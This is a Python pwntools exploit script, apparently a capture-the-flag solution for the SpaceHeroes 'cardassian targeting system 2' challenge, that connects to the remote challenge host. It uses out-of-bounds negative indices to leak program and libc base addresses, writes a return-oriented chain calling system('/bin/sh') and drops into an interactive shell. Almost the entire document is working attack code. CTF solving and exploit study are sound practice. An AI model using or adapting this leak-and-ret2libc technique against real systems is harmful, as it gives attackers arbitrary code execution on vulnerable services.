#!/usr/bin/python3
#-*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    io = remote("spaceheroes-cardassian-targeting-system-2.chals.io", 443, ssl=True, sni="spaceheroes-cardassian-targeting-system-2.chals.io")
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)


rl = lambda a=False : io.recvline(a)
ru = lambda a,b=True : io.recvuntil(a,b)
rn = lambda x : io.recvn(x)
s = lambda x : io.send(x)
sl = lambda x : io.sendline(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
ia = lambda : io.interactive()
dbg = lambda text=None : gdb.attach(io, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass

def cmd(choice):
    ru(b"[4] List specific set of coordinates\n")
    sl(i2b(choice))
def leak(idx):
    cmd(4)
    sl(i2b(idx))
    ru(b'coordinates: ')
    return int(ru(b'\n', "drop"))
def writedata(idx, data):
    cmd(3)
    sl(i2b(idx))
    sl(i2b(data))

debugPID()

#  ru(b'Please enter your name and rank >>> ')

payload = b"eastXueLian"
sl(payload)

elf_base = leak(-3) - 0xed4
lg("elf_base")
#  writedata(-3, sc_addr)
libc_base = leak(-17) - 0x89482
lg("libc_base")

pop_rdi_ret = libc_base + 0x0000000000026b72
system_addr = libc_base + libc.sym["system"]
binsh_addr  = libc_base + next(libc.search(b"/bin/sh\x00"))
writedata(-1, pop_rdi_ret+1)
writedata(0, pop_rdi_ret)
writedata(1, binsh_addr)
writedata(2,  system_addr)
writedata(-3, pop_rdi_ret)

ia()
